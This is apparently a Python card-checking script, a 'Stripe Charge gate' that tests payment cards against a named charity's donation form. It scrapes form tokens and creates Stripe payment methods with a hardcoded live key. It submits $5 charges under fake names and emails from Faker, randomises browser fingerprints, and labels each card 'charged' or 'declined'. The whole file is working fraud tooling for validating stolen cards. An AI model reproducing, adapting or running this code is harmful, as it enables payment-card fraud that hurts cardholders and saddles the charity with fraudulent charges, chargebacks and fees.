import asyncio
import re
import httpx
from bs4 import BeautifulSoup
from faker import Faker
from random import randint

fake = Faker()

DECLINE_CODES = [
    'approve_with_id', 'call_issuer', 'card_declined', 'card_not_supported', 'card_velocity_exceeded',
    'currency_not_supported', 'do_not_honor', 'do_not_try_again', 'duplicate_transaction',
    'expired_card', 'fraudulent', 'generic_decline', 'incorrect_number', 'incorrect_cvc',
    'incorrect_pin', 'incorrect_zip', 'insufficient_funds', 'invalid_account', 'invalid_amount',
    'invalid_cvc', 'invalid_expiry_month', 'invalid_expiry_year', 'invalid_number', 'invalid_pin',
    'issuer_not_available', 'lost_card', 'merchant_blacklist', 'new_account_information_available',
    'no_action_taken', 'not_permitted', 'offline_pin_required', 'online_or_offline_pin_required',
    'pickup_card', 'pin_try_exceeded', 'processing_error', 'reenter_transaction', 'restricted_card',
    'revocation_of_all_authorizations', 'revocation_of_authorization', 'security_violation',
    'service_not_allowed', 'stolen_card', 'stop_payment_order', 'testmode_decline', 'transaction_not_allowed',
    'try_again_later', 'withdrawal_count_limit_exceeded', 'declined', 'issue with your donation', 'error'
]

async def async_stripe_charge(card: str, amount: str = '5.00', retries: int = 3) -> dict:
    """
    Professional async Stripe Charge gate for donation flow.
    - Dynamically extracts form data, creates payment method, processes $5 charge.
    - Classifies response: 'charged' on success, 'declined' on Stripe codes, 'error' otherwise.
    - Retries on transient failures.
    """
    cc, mm, yy, cvv = card.split('|')
    name = fake.name()
    first, last = name.split(maxsplit=1)
    email = fake.email()

    base_headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'sec-ch-ua': f'"Not(A:Brand";v="8", "Chromium";v="{randint(110, 144)}", "Google Chrome";v="{randint(110, 144)}"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': fake.user_agent(),
    }

    async with httpx.AsyncClient(headers=base_headers, timeout=30.0, follow_redirects=True) as client:
        for attempt in range(retries):
            try:
                # Step 1: GET donate page & extract form_id, nonce
                resp = await client.get('https://www.brightercommunities.org/donate-form/')
                soup = BeautifulSoup(resp.text, 'html.parser')
                form_wrap = soup.find(id=re.compile(r'give-form-\d+-wrap'))
                form_id = re.search(r'give-form-(\d+)-wrap', form_wrap['id']).group(1) if form_wrap else '1938'
                hash_input = soup.find('input', {'name': 'give-form-hash'})
                nonce = hash_input['value'] if hash_input else ''

                # Step 2: POST load gateway
                load_data = {
                    'action': 'give_load_gateway',
                    'give_total': amount,
                    'give_form_id': form_id,
                    'give_form_id_prefix': f'{form_id}-1',
                    'give_payment_mode': 'stripe',
                    'nonce': nonce,
                }
                resp_load = await client.post('https://www.brightercommunities.org/wp-admin/admin-ajax.php?payment-mode=stripe', data=load_data)
                load_soup = BeautifulSoup(resp_load.text, 'html.parser')

                # Extract PK and account
                script = load_soup.find('script', string=re.compile(r'Stripe'))
                pk_match = re.search(r"Stripe\('(?P<pk>pk_[^']+)'", script.string if script else '')
                pk = pk_match.group('pk') if pk_match else 'pk_live_51Jzi6nQVHkKo6W5B7vi4ylBIE8w8OHJONrCOUQge1nPxjiIvbtlq1ivOEy6tltBXAZhZvAmYsrUe9Rm9tgzvZlw0008LIpS3ft'
                acc_match = re.search(r"_stripe_account\s*:\s*'(acct_[^']+)'", resp_load.text)
                acct = acc_match.group(1) if acc_match else 'acct_1Jzi6nQVHkKo6W5B'

                # Step 3: Create payment method
                pm_headers = base_headers.copy()
                pm_headers.update({
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                })
                guid = str(fake.uuid4())
                muid = client.cookies.get('__stripe_mid', str(fake.uuid4()))
                sid = client.cookies.get('__stripe_sid', str(fake.uuid4()))
                pm_data = (
                    f'type=card&billing_details[name]={first.replace(" ", "+")}+{last.replace(" ", "+")}&billing_details[email]={email.replace("@", "%40")}&'
                    f'card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
                    f'guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F1239285b29%3B+stripe-js-v3%2F1239285b29%3B+split-card-element&'
                    f'referrer=https%3A%2F%2Fwww.brightercommunities.org&time_on_page={randint(20000, 30000)}&key={pk}&_stripe_account={acct}'
                )
                resp_pm = await client.post('https://api.stripe.com/v1/payment_methods', headers=pm_headers, data=pm_data)
                pm_json = resp_pm.json()

                if 'error' in pm_json:
                    return {'status': 'declined', 'message': pm_json['error'].get('message', 'Payment method error')}

                pm_id = pm_json.get('id')
                if not pm_id:
                    return {'status': 'error', 'message': 'Failed to create payment method'}

                # Step 4: POST process donation
                post_data = {
                    'give-honeypot': '',
                    'give-form-id-prefix': f'{form_id}-1',
                    'give-form-id': form_id,
                    'give-form-title': 'Donation Form',
                    'give-current-url': 'https://www.brightercommunities.org/donate-form/',
                    'give-form-url': 'https://www.brightercommunities.org/donate-form/',
                    'give-form-minimum': '5.00',
                    'give-form-maximum': '999999.99',
                    'give-form-hash': nonce,
                    'give-price-id': 'custom',
                    'give-recurring-logged-in-only': '',
                    'give-logged-in-only': '1',
                    '_give_is_donation_recurring': '0',
                    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                    'give-amount': amount,
                    'give_stripe_payment_method': pm_id,
                    'payment-mode': 'stripe',
                    'give_first': first,
                    'give_last': last,
                    'give_email': email,
                    'card_name': name.upper(),
                    'give_action': 'purchase',
                    'give-gateway': 'stripe',
                }
                await client.post(f'https://www.brightercommunities.org/donate-form/?payment-mode=stripe&form-id={form_id}', data=post_data)

                # Step 5: GET final response & parse
                final_params = {'form-id': form_id, 'payment-mode': 'stripe', 'level-id': 'custom', 'custom-amount': amount}
                resp_final = await client.get('https://www.brightercommunities.org/donate-form/', params=final_params)
                final_soup = BeautifulSoup(resp_final.text, 'html.parser')
                error_div = final_soup.select_one('.give_errors .give_error p')
                message = error_div.text.strip() if error_div else ''

                if any(code.lower() in message.lower() for code in DECLINE_CODES):
                    return {'status': 'declined', 'message': message or 'Declined'}

                success_indicators = ['thank you', 'success', 'donation complete', 'payment successful']
                if message or any(ind in resp_final.text.lower() for ind in success_indicators):
                    return {'status': 'charged', 'message': message or 'Charged successfully'}

                return {'status': 'error', 'message': 'Unknown response'}

            except httpx.RequestError as e:
                if attempt == retries - 1:
                    return {'status': 'error', 'message': f'Network error: {str(e)}'}
                await asyncio.sleep(1)  # Backoff

    return {'status': 'error', 'message': 'Max retries exceeded'}